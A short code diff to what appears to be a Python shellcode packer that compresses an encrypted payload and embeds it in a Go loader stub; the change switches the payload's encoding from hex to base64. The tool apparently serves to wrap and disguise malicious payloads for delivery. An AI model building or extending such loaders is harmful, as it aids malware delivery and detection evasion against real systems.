@@ -4,6 +4,7 @@
 import argparse
 import sys
 import zlib
+from base64 import b64encode
 from random import randint
 from struct import pack
 try: 
@@ -60,10 +61,12 @@ if __name__ == "__main__":
     print("[*] Compressing payload...")
     encrypted = zlib.compress(encrypted)
 
+    print("[*] Encoding payload...")
+    encrypted = b64encode(encrypted).decode()
+
     print("[*] Generating source file...")
-    encrypted = ''.join(format(c, '02x') for c in encrypted)
     plain = payload[128:132]
-    known_bytes = ''.join(format(c, '02x') for c in plain)
+    known_bytes = b64encode(plain).decode()
 
     if args.type == "SHELLCODE" or args.type == "MANAGED":
         source = stub_shellcode_go.loader.format(encrypted, known_bytes)
